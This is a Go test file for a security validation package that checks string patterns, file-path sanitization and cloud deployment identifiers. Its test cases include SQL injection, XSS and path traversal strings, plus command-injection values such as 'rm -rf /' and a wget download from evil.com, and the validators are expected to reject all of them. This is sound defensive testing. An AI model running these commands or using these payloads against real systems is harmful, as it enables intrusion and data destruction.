package security

import (
	"regexp"
	"strings"
	"testing"
)

// Test SQL Injection Prevention
func TestStringValidator_SQLInjection(t *testing.T) {
	tests := []struct {
		name      string
		validator *StringValidator
		input     string
		wantErr   bool
		errMsg    string
	}{
		{
			name: "SQL injection - UNION SELECT",
			validator: &StringValidator{
				Pattern: regexp.MustCompile(`^[a-zA-Z0-9\s]+$`),
			},
			input:   "admin' UNION SELECT * FROM users--",
			wantErr: true,
			errMsg:  "string does not match required pattern",
		},
		{
			name: "SQL injection - OR 1=1",
			validator: &StringValidator{
				Pattern: regexp.MustCompile(`^[a-zA-Z0-9\s]+$`),
			},
			input:   "admin' OR '1'='1",
			wantErr: true,
			errMsg:  "string does not match required pattern",
		},
		{
			name: "SQL injection - comment",
			validator: &StringValidator{
				Pattern: regexp.MustCompile(`^[a-zA-Z0-9\s]+$`),
			},
			input:   "admin'--",
			wantErr: true,
			errMsg:  "string does not match required pattern",
		},
		{
			name: "SQL injection - DROP TABLE",
			validator: &StringValidator{
				Pattern: regexp.MustCompile(`^[a-zA-Z0-9\s]+$`),
			},
			input:   "'; DROP TABLE users;--",
			wantErr: true,
			errMsg:  "string does not match required pattern",
		},
		{
			name: "SQL injection - INSERT INTO",
			validator: &StringValidator{
				Pattern: regexp.MustCompile(`^[a-zA-Z0-9\s]+$`),
			},
			input:   "'; INSERT INTO users VALUES ('hacker', 'pass');--",
			wantErr: true,
			errMsg:  "string does not match required pattern",
		},
		{
			name: "valid alphanumeric input",
			validator: &StringValidator{
				Pattern: regexp.MustCompile(`^[a-zA-Z0-9\s]+$`),
			},
			input:   "john doe 123",
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.validator.Validate(tt.input)

			if tt.wantErr {
				if err == nil {
					t.Error("expected error, got nil")
				} else if tt.errMsg != "" && !strings.Contains(err.Error(), tt.errMsg) {
					t.Errorf("error = %v, want to contain %v", err, tt.errMsg)
				}
			} else {
				if err != nil {
					t.Errorf("unexpected error: %v", err)
				}
			}
		})
	}
}

// Test Command Injection Prevention
func TestStringValidator_CommandInjection(t *testing.T) {
	tests := []struct {
		name      string
		validator *StringValidator
		input     string
		wantErr   bool
	}{
		{
			name: "command injection - pipe",
			validator: &StringValidator{
				Pattern: regexp.MustCompile(`^[a-zA-Z0-9\s._-]+$`),
			},
			input:   "file.txt | cat /etc/passwd",
			wantErr: true,
		},
		{
			name: "command injection - semicolon",
			validator: &StringValidator{
				Pattern: regexp.MustCompile(`^[a-zA-Z0-9\s._-]+$`),
			},
			input:   "file.txt; rm -rf /",
			wantErr: true,
		},
		{
			name: "command injection - backticks",
			validator: &StringValidator{
				Pattern: regexp.MustCompile(`^[a-zA-Z0-9\s._-]+$`),
			},
			input:   "file.txt`whoami`",
			wantErr: true,
		},
		{
			name: "command injection - dollar sign",
			validator: &StringValidator{
				Pattern: regexp.MustCompile(`^[a-zA-Z0-9\s._-]+$`),
			},
			input:   "file$(whoami).txt",
			wantErr: true,
		},
		{
			name: "command injection - ampersand",
			validator: &StringValidator{
				Pattern: regexp.MustCompile(`^[a-zA-Z0-9\s._-]+$`),
			},
			input:   "file.txt & wget http://evil.com/malware",
			wantErr: true,
		},
		{
			name: "valid filename",
			validator: &StringValidator{
				Pattern: regexp.MustCompile(`^[a-zA-Z0-9\s._-]+$`),
			},
			input:   "my-file_123.txt",
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.validator.Validate(tt.input)

			if tt.wantErr {
				if err == nil {
					t.Error("expected error, got nil")
				}
			} else {
				if err != nil {
					t.Errorf("unexpected error: %v", err)
				}
			}
		})
	}
}

// Test XSS Prevention
func TestStringValidator_XSSPrevention(t *testing.T) {
	tests := []struct {
		name      string
		validator *StringValidator
		input     string
		wantErr   bool
	}{
		{
			name: "XSS - script tag",
			validator: &StringValidator{
				Pattern: regexp.MustCompile(`^[a-zA-Z0-9\s.,!?-]+$`),
			},
			input:   "<script>alert('XSS')</script>",
			wantErr: true,
		},
		{
			name: "XSS - img onerror",
			validator: &StringValidator{
				Pattern: regexp.MustCompile(`^[a-zA-Z0-9\s.,!?-]+$`),
			},
			input:   "<img src=x onerror=alert('XSS')>",
			wantErr: true,
		},
		{
			name: "XSS - javascript protocol",
			validator: &StringValidator{
				Pattern: regexp.MustCompile(`^[a-zA-Z0-9\s.,!?-]+$`),
			},
			input:   "<a href='javascript:alert(1)'>click</a>",
			wantErr: true,
		},
		{
			name: "XSS - event handler",
			validator: &StringValidator{
				Pattern: regexp.MustCompile(`^[a-zA-Z0-9\s.,!?-]+$`),
			},
			input:   "<div onload=alert('XSS')>",
			wantErr: true,
		},
		{
			name: "valid text",
			validator: &StringValidator{
				Pattern: regexp.MustCompile(`^[a-zA-Z0-9\s.,!?-]+$`),
			},
			input:   "Hello world, this is a test!",
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.validator.Validate(tt.input)

			if tt.wantErr {
				if err == nil {
					t.Error("expected error, got nil")
				}
			} else {
				if err != nil {
					t.Errorf("unexpected error: %v", err)
				}
			}
		})
	}
}

// Test Path Traversal Prevention
func TestSanitizeFilePath_PathTraversal(t *testing.T) {
	tests := []struct {
		name    string
		path    string
		baseDir string
		wantErr bool
		errMsg  string
	}{
		{
			name:    "path traversal with ../",
			path:    "../../../etc/passwd",
			baseDir: "/var/app",
			wantErr: true,
			errMsg:  "path traversal detected",
		},
		{
			name:    "path traversal hidden in path",
			path:    "files/../../../etc/passwd",
			baseDir: "/var/app",
			wantErr: true,
			errMsg:  "path traversal detected",
		},
		{
			name:    "absolute path outside base",
			path:    "/etc/passwd",
			baseDir: "/var/app",
			wantErr: true,
			errMsg:  "outside allowed directory",
		},
		{
			name:    "encoded path traversal",
			path:    "..%2F..%2Fetc%2Fpasswd",
			baseDir: "/var/app",
			wantErr: true,
			errMsg:  "path traversal detected",
		},
		{
			name:    "valid path within base",
			path:    "files/document.txt",
			baseDir: "/var/app",
			wantErr: false,
		},
		{
			name:    "valid absolute path matching base",
			path:    "/var/app/files/document.txt",
			baseDir: "/var/app",
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := SanitizeFilePath(tt.path, tt.baseDir)

			if tt.wantErr {
				if err == nil {
					t.Error("expected error, got nil")
				} else if tt.errMsg != "" && !strings.Contains(err.Error(), tt.errMsg) {
					t.Errorf("error = %v, want to contain %v", err, tt.errMsg)
				}
			} else {
				if err != nil {
					t.Errorf("unexpected error: %v", err)
				}
			}
		})
	}
}

// Test Length Limits
func TestStringValidator_LengthLimits(t *testing.T) {
	tests := []struct {
		name      string
		validator *StringValidator
		input     string
		wantErr   bool
	}{
		{
			name: "exceeds max length",
			validator: &StringValidator{
				MaxLength: 10,
			},
			input:   "this string is too long",
			wantErr: true,
		},
		{
			name: "below min length",
			validator: &StringValidator{
				MinLength: 10,
			},
			input:   "short",
			wantErr: true,
		},
		{
			name: "within length range",
			validator: &StringValidator{
				MinLength: 5,
				MaxLength: 20,
			},
			input:   "just right",
			wantErr: false,
		},
		{
			name: "exactly max length",
			validator: &StringValidator{
				MaxLength: 10,
			},
			input:   "exactly10c",
			wantErr: false,
		},
		{
			name: "exactly min length",
			validator: &StringValidator{
				MinLength: 5,
			},
			input:   "five!",
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.validator.Validate(tt.input)

			if tt.wantErr {
				if err == nil {
					t.Error("expected error, got nil")
				}
			} else {
				if err != nil {
					t.Errorf("unexpected error: %v", err)
				}
			}
		})
	}
}

// Test Special Character Handling
func TestStringValidator_SpecialCharacters(t *testing.T) {
	tests := []struct {
		name      string
		validator *StringValidator
		input     string
		wantErr   bool
	}{
		{
			name: "null byte detection",
			validator: &StringValidator{
				DisallowNullBytes: true,
			},
			input:   "test\x00data",
			wantErr: true,
		},
		{
			name: "control character detection",
			validator: &StringValidator{
				DisallowControlChars: true,
			},
			input:   "test\x01\x02data",
			wantErr: true,
		},
		{
			name: "allow newlines and tabs",
			validator: &StringValidator{
				DisallowControlChars: true,
			},
			input:   "test\nwith\ttabs",
			wantErr: false,
		},
		{
			name: "clean string",
			validator: &StringValidator{
				DisallowNullBytes:    true,
				DisallowControlChars: true,
			},
			input:   "clean string with spaces",
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.validator.Validate(tt.input)

			if tt.wantErr {
				if err == nil {
					t.Error("expected error, got nil")
				}
			} else {
				if err != nil {
					t.Errorf("unexpected error: %v", err)
				}
			}
		})
	}
}

// Test Boundary Conditions
func TestStringValidator_BoundaryConditions(t *testing.T) {
	tests := []struct {
		name      string
		validator *StringValidator
		input     string
		wantErr   bool
	}{
		{
			name:      "empty string with no constraints",
			validator: &StringValidator{},
			input:     "",
			wantErr:   false,
		},
		{
			name: "empty string with min length",
			validator: &StringValidator{
				MinLength: 1,
			},
			input:   "",
			wantErr: true,
		},
		{
			name: "single character at min length",
			validator: &StringValidator{
				MinLength: 1,
			},
			input:   "a",
			wantErr: false,
		},
		{
			name: "unicode characters within byte limit",
			validator: &StringValidator{
				MaxLength: 20, // "hello世界" is 11 bytes (hello=5, 世=3, 界=3)
			},
			input:   "hello世界",
			wantErr: false,
		},
		{
			name: "very long string",
			validator: &StringValidator{
				MaxLength: 100,
			},
			input:   strings.Repeat("a", 1000),
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.validator.Validate(tt.input)

			if tt.wantErr {
				if err == nil {
					t.Error("expected error, got nil")
				}
			} else {
				if err != nil {
					t.Errorf("unexpected error: %v", err)
				}
			}
		})
	}
}

// Test Integer Validator
func TestIntValidator(t *testing.T) {
	min := 0
	max := 100

	tests := []struct {
		name      string
		validator *IntValidator
		input     any
		wantErr   bool
	}{
		{
			name: "valid int",
			validator: &IntValidator{
				Min: &min,
				Max: &max,
			},
			input:   50,
			wantErr: false,
		},
		{
			name: "below minimum",
			validator: &IntValidator{
				Min: &min,
			},
			input:   -10,
			wantErr: true,
		},
		{
			name: "above maximum",
			validator: &IntValidator{
				Max: &max,
			},
			input:   150,
			wantErr: true,
		},
		{
			name:      "invalid type",
			validator: &IntValidator{},
			input:     "not a number",
			wantErr:   true,
		},
		{
			name: "int64 conversion",
			validator: &IntValidator{
				Min: &min,
				Max: &max,
			},
			input:   int64(75),
			wantErr: false,
		},
		{
			name: "float64 conversion",
			validator: &IntValidator{
				Min: &min,
				Max: &max,
			},
			input:   float64(80),
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.validator.Validate(tt.input)

			if tt.wantErr {
				if err == nil {
					t.Error("expected error, got nil")
				}
			} else {
				if err != nil {
					t.Errorf("unexpected error: %v", err)
				}
			}
		})
	}
}

// Test Float Validator
func TestFloatValidator(t *testing.T) {
	min := 0.0
	max := 100.0

	tests := []struct {
		name      string
		validator *FloatValidator
		input     any
		wantErr   bool
	}{
		{
			name: "valid float",
			validator: &FloatValidator{
				Min: &min,
				Max: &max,
			},
			input:   50.5,
			wantErr: false,
		},
		{
			name: "below minimum",
			validator: &FloatValidator{
				Min: &min,
			},
			input:   -10.5,
			wantErr: true,
		},
		{
			name: "above maximum",
			validator: &FloatValidator{
				Max: &max,
			},
			input:   150.5,
			wantErr: true,
		},
		{
			name:      "invalid type",
			validator: &FloatValidator{},
			input:     "not a number",
			wantErr:   true,
		},
		{
			name: "int conversion",
			validator: &FloatValidator{
				Min: &min,
				Max: &max,
			},
			input:   75,
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.validator.Validate(tt.input)

			if tt.wantErr {
				if err == nil {
					t.Error("expected error, got nil")
				}
			} else {
				if err != nil {
					t.Errorf("unexpected error: %v", err)
				}
			}
		})
	}
}

// Test SanitizeString
func TestSanitizeString(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "remove null bytes",
			input:    "test\x00data",
			expected: "testdata",
		},
		{
			name:     "remove control characters",
			input:    "test\x01\x02data",
			expected: "testdata",
		},
		{
			name:     "keep newlines and tabs",
			input:    "test\nwith\ttabs",
			expected: "test\nwith\ttabs",
		},
		{
			name:     "clean string unchanged",
			input:    "clean string",
			expected: "clean string",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := SanitizeString(tt.input)
			if result != tt.expected {
				t.Errorf("SanitizeString() = %q, want %q", result, tt.expected)
			}
		})
	}
}

// Test ValidateToolName
func TestValidateToolName(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{
			name:    "valid tool name",
			input:   "my-tool_123",
			wantErr: false,
		},
		{
			name:    "valid tool name with namespace",
			input:   "namespace:tool-name",
			wantErr: false,
		},
		{
			name:    "empty tool name",
			input:   "",
			wantErr: true,
		},
		{
			name:    "tool name too long",
			input:   strings.Repeat("a", 101),
			wantErr: true,
		},
		{
			name:    "invalid characters",
			input:   "tool@name!",
			wantErr: true,
		},
		{
			name:    "spaces not allowed",
			input:   "tool name",
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateToolName(tt.input)

			if tt.wantErr {
				if err == nil {
					t.Error("expected error, got nil")
				}
			} else {
				if err != nil {
					t.Errorf("unexpected error: %v", err)
				}
			}
		})
	}
}

// Test ValidateJSONObject
func TestValidateJSONObject(t *testing.T) {
	tests := []struct {
		name    string
		input   any
		wantErr bool
	}{
		{
			name:    "valid JSON object",
			input:   map[string]any{"key": "value"},
			wantErr: false,
		},
		{
			name:    "nil value",
			input:   nil,
			wantErr: true,
		},
		{
			name:    "string instead of object",
			input:   "not an object",
			wantErr: true,
		},
		{
			name:    "array instead of object",
			input:   []string{"not", "object"},
			wantErr: true,
		},
		{
			name:    "empty object",
			input:   map[string]any{},
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateJSONObject(tt.input)

			if tt.wantErr {
				if err == nil {
					t.Error("expected error, got nil")
				}
			} else {
				if err != nil {
					t.Errorf("unexpected error: %v", err)
				}
			}
		})
	}
}

// Benchmark tests
func BenchmarkStringValidator_Pattern(b *testing.B) {
	validator := &StringValidator{
		Pattern: regexp.MustCompile(`^[a-zA-Z0-9\s]+$`),
	}
	input := "valid input 123"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = validator.Validate(input)
	}
}

func BenchmarkSanitizeFilePath(b *testing.B) {
	path := "files/document.txt"
	baseDir := "/var/app"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, _ = SanitizeFilePath(path, baseDir)
	}
}

func BenchmarkSanitizeString(b *testing.B) {
	input := "test\nwith\x00null\x01control"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = SanitizeString(input)
	}
}

// Test deployment input validation functions
func TestValidateProjectID(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{
			name:    "valid project ID",
			input:   "my-project-123",
			wantErr: false,
		},
		{
			name:    "valid project ID min length",
			input:   "proj-1",
			wantErr: false,
		},
		{
			name:    "empty project ID",
			input:   "",
			wantErr: true,
		},
		{
			name:    "too short",
			input:   "abc",
			wantErr: true,
		},
		{
			name:    "too long",
			input:   strings.Repeat("a", 31),
			wantErr: true,
		},
		{
			name:    "starts with number",
			input:   "1project",
			wantErr: true,
		},
		{
			name:    "contains uppercase",
			input:   "My-Project",
			wantErr: true,
		},
		{
			name:    "contains special chars",
			input:   "project_name",
			wantErr: true,
		},
		{
			name:    "ends with hyphen",
			input:   "project-",
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateProjectID(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateProjectID() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestValidateNamespace(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{
			name:    "valid namespace",
			input:   "my-namespace",
			wantErr: false,
		},
		{
			name:    "valid namespace with numbers",
			input:   "namespace-123",
			wantErr: false,
		},
		{
			name:    "default namespace",
			input:   "default",
			wantErr: false,
		},
		{
			name:    "kube-system",
			input:   "kube-system",
			wantErr: false,
		},
		{
			name:    "empty namespace",
			input:   "",
			wantErr: true,
		},
		{
			name:    "too long",
			input:   strings.Repeat("a", 64),
			wantErr: true,
		},
		{
			name:    "contains uppercase",
			input:   "My-Namespace",
			wantErr: true,
		},
		{
			name:    "contains underscore",
			input:   "my_namespace",
			wantErr: true,
		},
		{
			name:    "ends with hyphen",
			input:   "namespace-",
			wantErr: true,
		},
		{
			name:    "starts with hyphen",
			input:   "-namespace",
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateNamespace(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateNamespace() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestValidateSecretName(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{
			name:    "valid secret name",
			input:   "my-secret",
			wantErr: false,
		},
		{
			name:    "valid with dots",
			input:   "my.secret.key",
			wantErr: false,
		},
		{
			name:    "valid with underscores",
			input:   "my_secret_key",
			wantErr: false,
		},
		{
			name:    "api key format",
			input:   "xai-api-key",
			wantErr: false,
		},
		{
			name:    "empty secret name",
			input:   "",
			wantErr: true,
		},
		{
			name:    "too long",
			input:   strings.Repeat("a", 254),
			wantErr: true,
		},
		{
			name:    "contains uppercase",
			input:   "My-Secret",
			wantErr: true,
		},
		{
			name:    "contains space",
			input:   "my secret",
			wantErr: true,
		},
		{
			name:    "starts with hyphen",
			input:   "-secret",
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateSecretName(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateSecretName() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestValidateServiceAccountEmail(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{
			name:    "valid service account email",
			input:   "aixgo-mcp@my-project-123.iam.gserviceaccount.com",
			wantErr: false,
		},
		{
			name:    "valid with numbers",
			input:   "service-123@project-456.iam.gserviceaccount.com",
			wantErr: false,
		},
		{
			name:    "empty email",
			input:   "",
			wantErr: true,
		},
		{
			name:    "missing domain",
			input:   "service@project",
			wantErr: true,
		},
		{
			name:    "wrong domain",
			input:   "service@project.gserviceaccount.com",
			wantErr: true,
		},
		{
			name:    "uppercase in name",
			input:   "Service@project-123.iam.gserviceaccount.com",
			wantErr: true,
		},
		{
			name:    "invalid project ID",
			input:   "service@1project.iam.gserviceaccount.com",
			wantErr: true,
		},
		{
			name:    "name ends with hyphen",
			input:   "service-@project-123.iam.gserviceaccount.com",
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateServiceAccountEmail(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateServiceAccountEmail() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestValidateRegion(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{
			name:    "valid region",
			input:   "us-central1",
			wantErr: false,
		},
		{
			name:    "valid region europe",
			input:   "europe-west1",
			wantErr: false,
		},
		{
			name:    "valid region asia",
			input:   "asia-northeast1",
			wantErr: false,
		},
		{
			name:    "empty region",
			input:   "",
			wantErr: true,
		},
		{
			name:    "too long",
			input:   strings.Repeat("a", 64),
			wantErr: true,
		},
		{
			name:    "contains uppercase",
			input:   "US-Central1",
			wantErr: true,
		},
		{
			name:    "contains underscore",
			input:   "us_central1",
			wantErr: true,
		},
		{
			name:    "starts with number",
			input:   "1-us-central",
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateRegion(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateRegion() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestValidateServiceName(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{
			name:    "valid service name",
			input:   "my-service",
			wantErr: false,
		},
		{
			name:    "valid with numbers",
			input:   "service-123",
			wantErr: false,
		},
		{
			name:    "aixgo service",
			input:   "aixgo-service",
			wantErr: false,
		},
		{
			name:    "empty service name",
			input:   "",
			wantErr: true,
		},
		{
			name:    "too short",
			input:   "s",
			wantErr: true,
		},
		{
			name:    "too long",
			input:   strings.Repeat("a", 64),
			wantErr: true,
		},
		{
			name:    "contains uppercase",
			input:   "My-Service",
			wantErr: true,
		},
		{
			name:    "ends with hyphen",
			input:   "service-",
			wantErr: true,
		},
		{
			name:    "starts with hyphen",
			input:   "-service",
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateServiceName(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateServiceName() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestValidateDeploymentInputs(t *testing.T) {
	tests := []struct {
		name        string
		projectID   string
		region      string
		serviceName string
		repoName    string
		imageName   string
		environment string
		wantErr     bool
	}{
		{
			name:        "all valid inputs",
			projectID:   "my-project-123",
			region:      "us-central1",
			serviceName: "aixgo-mcp",
			repoName:    "aixgo",
			imageName:   "mcp-server",
			environment: "production",
			wantErr:     false,
		},
		{
			name:        "invalid project ID",
			projectID:   "1invalid",
			region:      "us-central1",
			serviceName: "aixgo-mcp",
			repoName:    "aixgo",
			imageName:   "mcp-server",
			environment: "production",
			wantErr:     true,
		},
		{
			name:        "invalid region",
			projectID:   "my-project-123",
			region:      "US-CENTRAL1",
			serviceName: "aixgo-mcp",
			repoName:    "aixgo",
			imageName:   "mcp-server",
			environment: "production",
			wantErr:     true,
		},
		{
			name:        "invalid service name",
			projectID:   "my-project-123",
			region:      "us-central1",
			serviceName: "-invalid",
			repoName:    "aixgo",
			imageName:   "mcp-server",
			environment: "production",
			wantErr:     true,
		},
		{
			name:        "invalid environment",
			projectID:   "my-project-123",
			region:      "us-central1",
			serviceName: "aixgo-mcp",
			repoName:    "aixgo",
			imageName:   "mcp-server",
			environment: "Production",
			wantErr:     true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateDeploymentInputs(
				tt.projectID,
				tt.region,
				tt.serviceName,
				tt.repoName,
				tt.imageName,
				tt.environment,
			)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateDeploymentInputs() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}
